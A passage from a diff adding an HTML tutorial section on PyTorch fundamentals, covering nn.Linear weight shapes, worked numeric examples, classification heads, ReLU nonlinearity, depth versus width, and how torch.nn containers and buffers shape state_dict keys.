+        <li><strong>Edge weight = <code>W[i][j]</code></strong>: a weight of 0 means "no effective connection" (drawn as dashed lines in the figure) — so <code>y₀</code> only connects to h₀ and h₂, while <code>y₁</code> only connects to h₁ and h₃.</li>
+        </ul>
+        <blockquote>
+        <p><strong>Rule to nail down: <code>nn.Linear(in, out)</code> → W <code>[out, in]</code>, b <code>[out]</code>.</strong> When you dump a layer's <code>.weight</code>, its shape is <code>[out, in]</code> — that's how PyTorch stores it internally. So <code>fc1 = nn.Linear(3, 4)</code> → W <code>[4,3]</code>, b <code>[4]</code>, total <code>4×3 + 4 = 16</code> params; <code>fc2 = nn.Linear(4, 2)</code> → W <code>[2,4]</code>, b <code>[2]</code>, total <code>10</code> params. <strong>Note this entire derivation never used "column vectors" — only that fully-connected graph.</strong></p>
+        </blockquote>
+        <p><strong>What W and b each do:</strong></p>
+        <ul>
+        <li><strong>W does "projection / rotation / scaling"</strong>: its row i dots with the input, determining what aspects of the input neuron i "sees" and how much weight each gets.</li>
+        <li><strong>b does "translation"</strong>: adds a constant offset <strong>elementwise</strong> to the projection result, independent of the input.</li>
+        </ul>
+        <p>Together: <strong>one Linear = first apply W as a linear transform, then shift by b</strong> = the affine map <code>y = x @ W.T + b</code>.</p>
+        <p><strong>Structurally, W and b are two independent parameters:</strong> <code>nn.Linear</code> internally creates them as two separate <code>nn.Parameter</code> objects — <code>self.weight</code> (<code>[out,in]</code>) and <code>self.bias</code> (<code>[out]</code>), directly accessible as <code>model.fc1.weight</code> / <code>model.fc1.bias</code>. They appear as <strong>two separate records</strong> in <code>state_dict</code>: <code>fc1.weight</code>, <code>fc1.bias</code>. Loading from safetensors fills each <code>Parameter</code> back <strong>by key name</strong> — a key mismatch (version / structural change) errors out at this step. (Many LLM Linears use <code>bias=False</code>, in which case only <code>.weight</code> exists — that's why some model dumps have no bias keys.)</p>
+        <h3 id="s8-4">Walking through with real numbers (same graph, now with actual values)</h3>
+        <p>The previous section used the diagram to nail <strong>shapes</strong>; now we pour numbers into <strong>the same graph</strong> and watch them flow out. Take the second layer <code>fc2 = Linear(4, 2)</code>, with input h being the hidden layer's output <code>h = [2,5,1,2]</code>. W₂'s shape is <code>[out, in] = [2, 4]</code>, <strong>2 rows, 4 columns</strong>:</p>
+        <pre><code>W₂ = [[1, 0, 2, 0],     b₂ = [10,      h = [2, 5, 1, 2]   (the 4 hidden values)
+      [0, 1, 0, 3]]           20]
+
+y = h @ W₂.T + b₂
+  = [2,5,1,2]·[1,0,2,0] + 10 ,  [2,5,1,2]·[0,1,0,3] + 20     ← each ROW of W dotted with h
+  = (2 + 0 + 2 + 0) + 10     ,  (0 + 5 + 0 + 6) + 20
+  =  4              + 10     ,  11              + 20
+  = 14                       ,  31                            → y = [14, 31]
+</code></pre>
+        <p>Match it against the diagram: <strong>neuron 0</strong> (W₂ row 0 <code>[1,0,2,0]</code>, the two blue edges to <code>y₀</code>) "sees" only h₀ and h₂, computing <code>4</code>; <strong>neuron 1</strong> (W₂ row 1 <code>[0,1,0,3]</code>, the two teal edges to <code>y₁</code>) "sees" only h₁ and h₃, computing <code>11</code>; then each adds its bias, shifting to <code>[14, 31]</code>. <strong>The diagram shows structure (<code>[out,in]</code>); this step shows the computation — same graph, two reads.</strong></p>
+        <p><strong>With a batch</strong>, the input is <code>[batch, 4]</code>; <code>@ W₂.T</code> yields <code>[batch, 2]</code>, and b is <strong>broadcast</strong>-added to every row:</p>
+        <pre class="python"><code>H = [[2,5,1,2],
+     [1,1,1,1]]           # [batch=2, in=4]
+H @ W2.T + b2 == [[14, 31],
+                  [13, 24]]  # [batch=2, out=2]
+</code></pre>
+        <p>(The <code>.T</code> in <code>x @ W.T</code>, and how batch relates to "column vectors," is the most confusing spot — it's pulled out to <strong>Appendix Two</strong> at the end of this section. If you just want to use <code>x @ W.T</code> without digging deeper, skip it.)</p>
+        <h3 id="s8-5">What TinyNet actually does: look at the output end and the input end separately</h3>
+        <p>Mathematically it's a function ℝ³ → ℝ² mapping a 3-D vector to a 2-D vector; structurally it's a "two-layer MLP" (two Linears, one hidden layer). Untrained, its output is meaningless; but <strong>train</strong> this <code>3→4→2</code> shape and you have a textbook <strong>simple binary classifier</strong>.</p>
+        <p>To judge whether it "fits", split it into its two ends — <strong>the conclusions are very asymmetric</strong>.</p>
+        <p><strong>The output end: always right.</strong> It emits 2 logits at the end, which matches any "pick one of two": transaction normal vs fraud, spam vs not, positive vs negative review. <strong>As long as the final decision is one-of-two, the output end is fine.</strong></p>
+        <p><strong>The input end: that's the real question.</strong> The constructor argument "3 features" <strong>is literally true only when the input naturally is a few numbers</strong>:</p>
+        <ul>
+        <li><strong>Holds</strong>: a credit-card transaction's amount / geo-distance / frequency → <code>TinyNet(3)</code>; an iris flower's sepal length / sepal width / petal length / petal width → <code>TinyNet(4)</code>; a few lab values → sick vs healthy. <strong>Use as is.</strong></li>
+        <li><strong>Doesn't hold</strong>: an email, a movie review. <strong>The output end matches perfectly (still one-of-two), but the input end is stuck</strong> — text is not naturally a few numbers. To feed it in, you first have to turn it into a fixed-length vector: either hand-assemble a few features (link count / exclamation-mark count / contains "free" …), or compress it with an encoding model (but that's typically 384 / 768 / 1024 dimensions).</li>
+        </ul>
+        <p><strong>And the question "what do we do at the input end" is exactly what reveals TinyNet's true identity.</strong> But first a word that will recur needs defining.</p>
+        <h4>An aside: what is a "head"</h4>
+        <p>Real models are almost all two-stage:</p>
+        <pre><code>input → [ backbone: dozens of layers, compressing the input into a general-purpose vector representation ]
+      → [ head: one or two layers, turning that vector into the output the current task wants ]
+</code></pre>
+        <p><strong>The backbone is general, pretrained, and large; the head is task-specific and small.</strong> The same backbone with different heads is a different task:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>head</th>
+        <th>eats</th>
+        <th>emits</th>
+        <th>used for</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>LM head</strong></td>
+        <td>the last layer's hidden <code>[D]</code></td>
+        <td><code>[vocab]</code> scores</td>
+        <td>predicting the next token (generation)</td>
+        </tr>
+        <tr>
+        <td><strong>classification head</strong></td>
+        <td>one sentence vector <code>[D]</code></td>
+        <td><code>[2]</code> or <code>[N]</code> scores</td>
+        <td>discrimination (sentiment, intent, fraud or not)</td>
+        </tr>
+        <tr>
+        <td><strong>Pooler</strong></td>
+        <td>one vector per token <code>[N, D]</code></td>
+        <td>one sentence vector <code>[D]</code></td>
+        <td>compressing a sequence into one vector (retrieval)</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>It's called a "head" because it pairs with "backbone" — the backbone holds things up from below, and the head sits on top.</p>
+        <p><strong>And TinyNet's shape is exactly the shape of a classification head.</strong> Change the input dimension to 1024, put it after a text encoder (something like BGE), and you have a real sentiment classifier — <code>text → encoded into a 1024-dim vector → this small MLP → 2 logits</code>. <strong>The encoder compresses the text into a vector; TinyNet makes the final call on that vector.</strong></p>
+        <p>The same <code>TinyNet</code> class: <code>TinyNet(3)</code> is credit-card fraud control, <code>TinyNet(1024)</code> is a classification head behind an encoder — <strong>the structure is fixed; "how many input features" is just a knob.</strong> (§0.5 mentioned the even lazier version: don't write the small MLP at all, use an sklearn logistic regression as the head.)</p>
+        <blockquote>
+        <p>This "backbone + a head on the end" structure isn't specific to toys: real large models and text-encoding models <strong>share the first few dozen layers and differ only in which head goes on the end</strong>. Part 2 uses this idea all the way through.</p>
+        </blockquote>
+        <h4>Wait — by §0.5's criterion, shouldn't this example use sklearn?</h4>
+        <p><strong>Yes.</strong> Three numeric features, binary classification — that's exactly the "a table" tier. A random forest does it in three lines, and probably does it better.</p>
+        <p><strong>But TinyNet isn't here to solve fraud control; it's a specimen.</strong> Its only reason to exist is that it's <strong>small enough to draw every weight on paper</strong>, which makes it good for explaining three things:</p>
+        <ul>
+        <li>why the <code>state_dict</code> keys are <code>fc1.weight</code>, and how that rule extends all the way to <code>model.layers.0.self_attn.q_proj.weight</code> (§7)</li>
+        <li>why the weight of <code>nn.Linear(in, out)</code> is <code>[out, in]</code></li>
+        <li>why there must be a ReLU between the two Linears</li>
+        </ul>
+        <p><strong>And you're learning these three things to read Qwen3 and BGE, not to do fraud control.</strong> Swap in a random forest and you can explain none of them — a tree model has no <code>state_dict</code>, no <code>[out, in]</code>, no activation function.</p>
+        <p>Its identity as a "classification head" is real, though, and there's <strong>one scenario sklearn can't cover</strong>:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Scenario</th>
+        <th>Can sklearn do it?</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>The encoder is <strong>frozen</strong>; you only train a classifier on the vectors it outputs</td>
+        <td><strong>Yes, and it's less work</strong> (§0.5 recommends logistic regression for exactly this)</td>
+        </tr>
+        <tr>
+        <td>The classification head is <strong>fine-tuned together with</strong> the encoder</td>
+        <td><strong>No</strong> — the gradient has to flow from the head all the way back into the encoder, and an sklearn classifier is not on the gradient chain</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>The second row is the real reason heads in real systems use <code>nn.Linear</code> rather than sklearn, <strong>and it's exactly the "can the gradient get through" in that parenthetical in §0.5.</strong></p>
+        <h3 id="s8-6">From "one Linear" to "a network": why there must be a ReLU in between</h3>
+        <p>That covers one Linear (projection + shift). TinyNet is <strong>two</strong> Linears stacked, with a ReLU between them. That ReLU <strong>is not optional decoration; it's the only reason depth does anything</strong>:</p>
+        <p><strong>Without ReLU, two Linear layers collapse into one.</strong> <code>W₂(W₁x + b₁) + b₂</code> expands to <code>(W₂W₁)x + (W₂b₁ + b₂)</code> — <code>W₂W₁</code> is still one matrix and what follows is still one constant vector, so the whole thing is still <strong>one</strong> affine transform, equivalent to a single <code>Linear(3,2)</code>. Stacking two layers = stacking for nothing.</p>
+        <p><strong>ReLU (clip negatives to 0) inserts a nonlinearity, and only then can the two layers not collapse back.</strong> With that one "fold", <code>W₂·relu(W₁x + b₁) + b₂</code> can no longer be simplified to a single <code>Wx + b</code>, and the two layers together can learn a nonlinear decision boundary. Everything depth achieves rests on these nonlinearities between layers.</p>
+        <figure><img src="./images/mlp-molecule-en.svg" alt="Two layers: without ReLU they collapse into one; with ReLU in between they are really two layers" /></figure>
+        <p>Walk through <code>TinyNet(3)</code>'s forward with shapes (single sample, <code>batch=1</code>):</p>
+        <pre class="python"><code>def forward(self, x):                 # x: [1, 3]   (batch=1, 3 features)
+    x = torch.relu(self.fc1(x))       # fc1: [1,3]→[1,4];  relu doesn&#39;t change shape: [1,4]→[1,4]
+    return self.fc2(x)                # fc2: [1,4]→[1,2]    out: [1,2]
+</code></pre>
+        <p>Three steps: <code>fc1</code> lifts 3 dimensions to 4 (the hidden layer — <code>h</code> is just <strong>another vector</strong>, don't make it mysterious); <code>relu</code> clips negatives to 0 element-wise, adding nonlinearity without changing the shape; <code>fc2</code> squeezes 4 dimensions to 2, which are the final 2 class scores (logits).</p>
+        <h3 id="s8-7">How many hidden layers? — and taking apart the "three-layer network" naming trap</h3>
+        <p>TinyNet has only <strong>one</strong> hidden layer. When you need it to do real work, how do you decide how many hidden layers and how wide each one is?</p>
+        <p><strong>First the naming trap: "three layers" doesn't count hidden layers.</strong> The classic "three-layer network on MNIST" in older textbooks (<code>784 → hidden → 10</code>) counts <strong>node layers</strong>: input layer + hidden layer + output layer = 3. PyTorch counts <strong>weight layers</strong> (how many <code>nn.Linear</code>): the same network has <strong>2 Linears and 1 hidden layer</strong>. <strong>So that "three-layer network" is the same shape as TinyNet</strong> — not three hidden layers. Both counting conventions are in circulation; when you see "N layers", first ask whether it counts nodes or weights. (Real models always count weight layers: Qwen3's "32 layers" are 32 transformer blocks.)</p>
+        <p><strong>Why one hidden layer is enough (in theory): the <a href="https://en.wikipedia.org/wiki/Universal_approximation_theorem">universal approximation theorem</a>.</strong> The results from Cybenko (1989) / Hornik (1991) say: <strong>a single hidden layer + enough width + a nonlinear activation</strong> can approximate any continuous function on a compact set arbitrarily well. But the theorem only guarantees that "such a set of weights exists"; it <strong>says nothing about how many neurons it takes</strong> (possibly exponentially many), <strong>nor whether SGD (stochastic gradient descent) can find them</strong>. So the right reading is "one layer is enough in principle", not "one layer is optimal".</p>
+        <blockquote>
+        <p><strong>Wait — can everything we want a network to do really be written as a "function"?</strong> Binary classification obviously can, but what about generation, or conversation? The answer is yes, and the trick is <strong>to change what counts as the output</strong>:</p>
+        <ul>
+        <li><strong>The network itself is a function by construction</strong>: one <code>forward</code> is a deterministic tensor mapping; same input + same weights → same output. So the question was never "can the network be a function" but "can the task be arranged into the shape of a function".</li>
+        <li><strong>One-to-many (randomness) → output a distribution instead of an answer.</strong> The same prompt can be continued in countless ways, which doesn't look like a function — but what the LLM's network emits is not the word, it's <strong>the probability distribution over the next token</strong> (<code>[vocab]</code> logits). <code>prompt → distribution</code> is <strong>single-valued</strong>; the randomness happens in sampling <strong>outside</strong> the network (temperature / top-p). TTS and ASR work the same way. The 2 logits of binary classification are the same thing, with vocab = 2.</li>
+        <li><strong>Needs memory (state) → put the state into the input.</strong> A function has no memory, so multi-turn conversation puts the whole history into the <strong>context window</strong> — the domain gets wider, and each call is still a pure function. The KV cache is only a cache for that pure function, not a state machine.</li>
+        <li><strong>Needs multi-step computation → move the loop outside the network.</strong> The amount of computation in one forward pass is <strong>fixed</strong> (layers × width), so it can't run an algorithm with an unbounded number of steps. The fix isn't to make the network something other than a function, but to <strong>call the same function repeatedly</strong>: autoregressive decoding iterates N times; chain of thought feeds the output back in as the next input. <strong>The "steps" depth can't give you come from the outer loop.</strong></li>
+        </ul>
+        <p>So the three things that "don't look like a function" — <strong>randomness, memory, iteration</strong> — <strong>have all been moved outside the network</strong>, and a pure function always remains inside. (This is also why inference engines can confidently schedule an LLM as a "stateless function + KV cache" — Part 2 goes into it.)</p>
+        <p>While we're at it, how strict the two terms in the theorem are: <strong>"compact set"</strong> (a bounded region) isn't an obstacle in practice (inputs are bounded anyway), but it draws the <strong>failure boundary</strong> — <strong>outside the region (OOD, out of distribution) the theorem guarantees nothing</strong>, and that's the root of models talking nonsense outside their training distribution. <strong>"Continuous function"</strong> — classification labels jump and aren't continuous, but the network learns <strong>continuous logits</strong>, and the jump happens in the <code>argmax</code> <strong>after</strong> the network; later work also extended the result to weaker senses. <strong>In one sentence: whether something can be represented as a function is almost never the bottleneck; what stops you is whether SGD can find it, whether you have the data, and whether the inductive bias is right.</strong></p>
+        </blockquote>
+        <p><strong>Then why do real models keep stacking deeper? — depth is cheaper than width.</strong> For the same parameter budget, depth can <strong>reuse intermediate representations</strong>: the data itself is hierarchical / compositional (images: edges → textures → parts → objects; text: characters → words → phrases → meaning), and each extra layer abstracts once more on top of the previous layer's abstraction. Some functions need <strong>exponential</strong> width to approximate with a shallow network, while a deep network needs only linear. That's why it's "dozens of layers" and not "one ultra-wide layer".</p>
+        <p><strong>Back to the common question: would one more hidden layer help?</strong> First the causal chain, then measured numbers.</p>
+        <blockquote>
+        <p><strong>Deeper = more capacity. And on tasks like handwritten digit recognition, the bottleneck is not capacity, it's generalization.</strong></p>
+        <p>A single hidden layer already fits the training set almost perfectly — which shows the network is <strong>fully capable</strong> of representing the data. The few percent it gets wrong are on the <strong>test set</strong>: unseen, slanted, blurry samples. And poor generalization comes from <strong>the wrong inductive bias</strong>: an MLP flattens the image into a row of independent numbers and has no idea which two pixels are neighbors. <strong>Adding layers only adds capacity, it doesn't change the bias, so adding them doesn't help.</strong></p>
+        <p>An analogy: you got exam questions wrong not because "your brain is too small" but because "your method is wrong". Memorizing it one more time still gets it wrong.</p>
+        </blockquote>
+        <p>This is a live instance of the sentence in section 2 of the appendix at the end — <strong>the bottleneck was never expressive power; it's whether you can learn the right function from limited data and generalize.</strong></p>
+        <p><strong>Measured</strong> (using sklearn's built-in <code>digits</code>, 8×8 handwritten digits, 1,797 images, nothing to download; averaged over 5 random seeds):</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Structure</th>
+        <th style="text-align: right;">Parameters</th>
+        <th style="text-align: right;">Train</th>
+        <th style="text-align: right;">Test</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>1 hidden layer (64)</td>
+        <td style="text-align: right;">4,810</td>
+        <td style="text-align: right;">0.978</td>
+        <td style="text-align: right;">0.967</td>
+        </tr>
+        <tr>
+        <td>2 hidden layers (64,64)</td>
+        <td style="text-align: right;">8,970</td>
+        <td style="text-align: right;">0.995</td>
+        <td style="text-align: right;"><strong>0.977</strong></td>
+        </tr>
+        <tr>
+        <td>1 hidden layer (128)</td>
+        <td style="text-align: right;">9,610</td>
+        <td style="text-align: right;">0.987</td>
+        <td style="text-align: right;">0.974</td>
+        </tr>
+        <tr>
+        <td>2 hidden layers (128,128)</td>
+        <td style="text-align: right;">26,122</td>
+        <td style="text-align: right;"><strong>1.000</strong></td>
+        <td style="text-align: right;">0.976</td>
+        </tr>
+        <tr>
+        <td>3 hidden layers (128×3)</td>
+        <td style="text-align: right;">42,634</td>
+        <td style="text-align: right;"><strong>1.000</strong></td>
+        <td style="text-align: right;">0.973</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>These numbers lay the mechanism out:</strong></p>
+        <ul>
+        <li>Adding the second layer <strong>does give a small gain</strong> (0.967 → 0.977) — so "completely useless" isn't accurate.</li>
+        <li>But <strong>the training set reaches 1.000</strong>: capacity was more than enough long ago.</li>
+        <li><strong>Perfect on train, stuck at 0.97 on test</strong> → the bottleneck is clearly not capacity.</li>
+        <li>4.7× the parameters (4,810 → 26,122) buys only +0.9 points on test, and <strong>the third layer starts going backwards</strong> (0.973).</li>
+        </ul>
+        <p><strong>Going deeper also has two costs</strong>, which explain why "going backwards" isn't an accident:</p>
+        <ul>
+        <li><strong>Easier to overfit</strong>: more parameters, a perfect training score and an unmoving test score — that's what it looks like.</li>
+        <li><strong>Harder to optimize</strong>: the gradient has to pass through more layers and tends to vanish or explode. That's exactly where deep MLPs got stuck being "untrainable" in the '90s. <strong>Naively stacking 10 <code>Linear + ReLU</code> may well be worse than 2 layers.</strong></li>
+        </ul>
+        <p><strong>Then how do modern models stack up to 72 layers?</strong> Not by "stacking a few more Linears", but with a whole set of parts that make depth <strong>trainable</strong>: <strong>residual connections</strong> (leaving the gradient a straight path through), <strong>normalization</strong> (LayerNorm / RMSNorm keep each layer's distribution stable), better initialization and optimizers. <strong>Residuals + norm are the entry ticket to "the depth dividend".</strong></p>
+        <p><strong>Practical rules from the inference-stack point of view:</strong></p>
+        <ul>
+        <li><strong>Classification head: 0–1 hidden layers is plenty.</strong> The kind of classification head that sits behind a text encoder is usually a single <code>Linear</code>, or a TinyNet shape like <code>Linear → activation → Linear</code>. Spending depth here is pointless — the heavy lifting is done by the embedding model.</li>
+        <li><strong>Width is a purely empirical knob</strong>: 128 / 256 / 512 are common on MNIST, tuned against a validation set; there's no formula.</li>
+        <li><strong>Spend depth where there's structure to exploit</strong>: convolutions for images, attention for text. <strong>Blindly adding MLP layers is the least cost-effective way to add.</strong></li>
+        <li><strong>Don't read an LLM's "dozens of layers" as dozens of bare Linears</strong>: they're dozens of <strong>transformer blocks</strong>, each with attention + FFN + residual + norm inside. And interestingly — <strong>the FFN in each block is exactly a two-layer MLP</strong> (<code>Linear → activation → Linear</code>, with the middle about 4× wider). <strong>The TinyNet shape appears dozens of times in one LLM.</strong> How those dozens of blocks are stacked with <code>nn.ModuleList</code> and what their keys look like: see <strong>Appendix One</strong>.</li>
+        </ul>
+        <h3 id="s8-8">Wrapping up: how this maps to real models</h3>
+        <p>This scaffolding — "<code>__init__</code> defines layers + <code>forward</code> chains them + parameters go into the state_dict automatically" — is <strong>exactly the same</strong> as in Qwen3 and bge; they just replace "2 Linears" with an embedding table + dozens of transformer layers + an LM head / Pooler. See through these few lines of toy code and real model structures stop being dizzying.</p>
+        <p>(Also note the call above is written <code>model(x)</code>, not <code>model.forward(x)</code> — that's not just style; calling <code>.forward()</code> directly <strong>silently</strong> skips a batch of infrastructure. The reason is at the end of <strong>Appendix One</strong>.)</p>
+        <blockquote>
+        <p><strong>A route in the opposite direction (skippable).</strong> This section goes <strong>down</strong> from the <code>nn.Module</code> abstraction to the weight file; the mainstream route mentioned at the start (the official <code>nn_tutorial</code>, the Manning book) goes <strong>the other way</strong> — first hand-write a working network with bare tensors, then swap in <code>nn.Module</code> / <code>optim</code> / <code>DataLoader</code> step by step. <strong>The same black box, taken apart two ways</strong>: that route ends at <code>optimizer.step()</code>, this one ends at <code>model.layers.0.self_attn.q_proj.weight</code>. Which one is useful to you depends on whether you're training or deploying.</p>
+        </blockquote>
+        <hr />
+        <h3 id="s8-9">Appendix One: TinyNet touches only two things — what else is in the <code>torch.nn</code> cabinet</h3>
+        <p>TinyNet uses only <code>nn.Linear</code> + <code>torch.relu</code>. There's a lot more in <code>torch.nn</code>; here's a map <strong>sorted by "will your inference stack run into it"</strong> — the point isn't to list APIs but to let you, when you dump a real model, <strong>recognize which module produced each key</strong>.</p>
+        <p><strong>1) Layers — sort them by relevance, don't list them flat.</strong> The ones you'll actually touch, all already seen in this document:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Module</th>
+        <th>Notes</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>nn.Linear</code></td>
+        <td>Fully connected layer, the star of this section; in an LLM <code>q_proj</code> / <code>k_proj</code> / <code>gate_proj</code> / <code>lm_head</code> are all this</td>
+        </tr>
+        <tr>
+        <td><code>nn.Embedding</code></td>
+        <td>Token embedding lookup table <code>[vocab, hidden]</code>; <strong>LLMs have one too, and it's often the largest tensor</strong> (detailed in Part 2)</td>
+        </tr>
+        <tr>
+        <td><code>nn.LayerNorm</code></td>
+        <td>Normalization — the <code>...norm.weight</code> entries in a dump; transformers use LayerNorm, <strong>not</strong> BatchNorm (the LLaMA / Qwen family uses RMSNorm, same tier)</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>From other domains, which you'll basically never meet:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Module</th>
+        <th>Notes</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>nn.Conv2d</code></td>
+        <td>Convolution, used by CNNs (the TinyConv in the appendix at the end touches it briefly)</td>
+        </tr>
+        <tr>
+        <td><code>nn.Dropout</code></td>
+        <td>Random dropping during training; <strong>a no-op at inference</strong> (turned off by <code>model.eval()</code> in §4)</td>
+        </tr>
+        <tr>
+        <td><code>nn.BatchNorm2d</code></td>
+        <td>Batch normalization in vision, with running statistics kept during training</td>
+        </tr>
+        <tr>
+        <td><code>nn.LSTM</code></td>
+        <td>The recurrent layer of the RNN era, fully replaced by transformers</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>One to clarify: the <strong>concept</strong> behind <code>nn.Transformer</code> / <code>nn.MultiheadAttention</code> is introduced in this document from §5 and used throughout Part 2, but <strong>these two modules, literally, are basically never imported in production</strong> — HF and vLLM each write their own modeling code. So read it as "the concept", not "the class you'll be using".</p>
+        <p><strong>2) Activations — one sentence:</strong> TinyNet's <code>ReLU</code> is a toy choice; <strong>real LLMs use GELU / SiLU / SwiGLU</strong>, and which one is in the <code>hidden_act</code> field of <code>config.json</code> (§7). A hook for "read the config to identify the activation" is enough; no need to memorize the table.</p>
+        <p><strong>3) Loss functions — one sentence:</strong> <code>nn.CrossEntropyLoss</code> / <code>MSELoss</code> and the rest are <strong>purely training-side</strong>, living in the back half of §4's <code>forward → loss → backward → optimizer.step()</code>, just like <code>optimizer</code> — <strong>inference never touches them</strong>. Knowing <code>nn</code> has this drawer is enough; not expanded here.</p>
+        <p><strong>4) Containers — the drawer most worth looking at; it explains the "numbered keys" of real models.</strong> TinyNet hand-writes two named attributes <code>self.fc1 / self.fc2</code> → flat keys. But a real transformer has dozens of identical blocks, and you can't hand-write <code>self.fc1…fc72</code> — containers are the answer to "a pile of identical layers", and the trace they leave is exactly the <strong>numbered keys</strong> you'll run into when you dump Qwen3, which TinyNet doesn't have:</p>
+        <pre class="python"><code># Original TinyNet: two named submodules → flat keys
+#   self.fc1 / self.fc2  →  fc1.weight, fc1.bias, fc2.weight, fc2.bias
+
+# Sequential: numbered automatically by &quot;position in the stack&quot;; you don&#39;t even write forward
+seq = nn.Sequential(nn.Linear(3,4), nn.ReLU(), nn.Linear(4,2))
+#   keys: 0.weight, 0.bias, 2.weight, 2.bias
+#         ↑ ReLU is at index 1 and has no parameters, so it&#39;s simply skipped in the keys
+
+# ModuleList: how a real transformer stacks N layers; you write the forward loop yourself
+class Stack(nn.Module):
+    def __init__(self, n):
+        super().__init__()
+        self.layers = nn.ModuleList([Block() for _ in range(n)])
+    def forward(self, x, mask):
+        for blk in self.layers:      # hand-written loop — each layer also takes mask / pos / kv-cache
+            x = blk(x, mask)
+        return x
+#   keys: layers.0.&lt;...&gt;, layers.1.&lt;...&gt;, ...
+#         ↑ exactly the number in model.layers.0.self_attn.q_proj.weight when you dump Qwen3
+</code></pre>
+        <p>Three points to nail down:</p>
+        <ul>
+        <li><strong>Containers exist to "register" (a trap that bites).</strong> Taking a shortcut and writing a plain Python list <code>self.layers = [Block() …]</code> <strong>silently doesn't register them</strong>: they're not in the state_dict, <code>.to("cuda")</code> doesn't move them, and they have no gradients. This completes the earlier sentence "assigning to <code>self.xxx</code> registers it automatically" with "what about a pile of layers".</li>
+        <li><strong>Why real models use <code>ModuleList</code> rather than the less-work <code>Sequential</code>:</strong> <code>Sequential</code> only fits a straight pipe where "the previous layer's output is the next layer's only input"; a transformer block also takes mask / position / KV cache and has a residual branch — not a straight pipe — so it has to be <code>ModuleList</code> + a hand-written forward loop (attention needs extra state; Part 2 goes into it).</li>
+        <li><code>nn.ModuleDict</code> (stored by name, e.g. grouping encoder / decoder) registers the same way and is used less; knowing it exists is enough.</li>
+        </ul>
+        <p>In one sentence: <strong>Layers are "which layers are in the drawer"; Containers are "how those layers are assembled into real, numbered keys"</strong> — put the two together and you go straight from TinyNet's <code>fc1.weight</code> to Qwen3's <code>model.layers.0.self_attn.q_proj.weight</code>.</p>
+        <p><strong>One last cut: <code>nn.Module</code> has two kinds of "magic", and bypassing either one fails silently.</strong> The plain-list trap above is only half of it:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Magic</th>
+        <th>How you trigger it</th>
+        <th>What happens if you bypass it</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong><code>__setattr__</code> → registration</strong></td>
+        <td><code>self.layers = nn.ModuleList([...])</code></td>
+        <td>Written as a plain list: not in the state_dict, <code>.to()</code> doesn't move it, no gradients</td>
+        </tr>
+        <tr>
+        <td><strong><code>__call__</code> → hooks</strong></td>
+        <td><code>model(x)</code> / <code>blk(x, mask)</code> in the loop</td>
+        <td>Calling <code>.forward()</code> directly: <strong>skips every hook</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>First, expanding the first row: "registration" is not one tier but four.</strong> The plain list above is just the most visible way to leak. The full four tiers (measured on torch 2.13):</p>
+        <table>
+        <thead>
+        <tr>
+        <th>How you write it</th>
+        <th>Learnable (has gradient)</th>
+        <th>In <code>state_dict</code></th>
+        <th>Moved by <code>.to()</code></th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>self.w = nn.Parameter(t)</code></td>
+        <td>✓</td>
+        <td>✓</td>
+        <td>✓</td>
+        </tr>
+        <tr>
+        <td><code>self.register_buffer("m", t)</code></td>
+        <td>✗</td>
+        <td>✓</td>
+        <td>✓</td>
+        </tr>
+        <tr>
+        <td><code>self.register_buffer("m", t, persistent=False)</code></td>
+        <td>✗</td>
+        <td><strong>✗</strong></td>
+        <td>✓</td>
+        </tr>
+        <tr>
+        <td><code>self.m = torch.zeros(...)</code></td>
+        <td>✗</td>
+        <td>✗</td>
+        <td><strong>✗</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <p>Minimal repro:</p>
+        <pre class="python"><code>class Demo(nn.Module):
+    def __init__(self):
+        super().__init__()
+        self.lin = nn.Linear(4, 2)                                   # submodule
+        self.scale = nn.Parameter(torch.ones(2))                     # learnable parameter
+        self.register_buffer(&quot;running_mean&quot;, torch.zeros(2))         # persistent buffer
+        self.register_buffer(&quot;inv_freq&quot;, torch.arange(2.), persistent=False)
+        self.plain = torch.zeros(2)                                  # plain attribute — none of the above
+
+# named_parameters: [&#39;scale&#39;, &#39;lin.weight&#39;, &#39;lin.bias&#39;]
+# named_buffers   : [&#39;running_mean&#39;, &#39;inv_freq&#39;]
+# state_dict keys : [&#39;scale&#39;, &#39;running_mean&#39;, &#39;lin.weight&#39;, &#39;lin.bias&#39;]
+#                              ↑ not learnable, but in the file   ↑ inv_freq isn&#39;t there
+
+# after m.to(torch.float64):
+#   lin.weight / scale / running_mean / inv_freq  all become float64
+#   plain is still float32   ← didn&#39;t come along
+</code></pre>
+        <p>Three sentences to nail it down:</p>
+        <ul>
+        <li><strong><code>nn.Parameter</code> is "to be learned"</strong> — <code>requires_grad=True</code>, in <code>named_parameters()</code>, in the state_dict. (In passing: the <code>emb.weight.data</code> and <code>.detach()</code> in later code both mean "strip off the Parameter shell and get the plain tensor underneath, with no gradient attached" — the same Storage, just no longer in the computation graph. Modifying <code>.data</code> changes the weight directly and leaves no trace, so it should only appear where "I really do mean to edit the weights by hand", such as a conversion script.)</li>
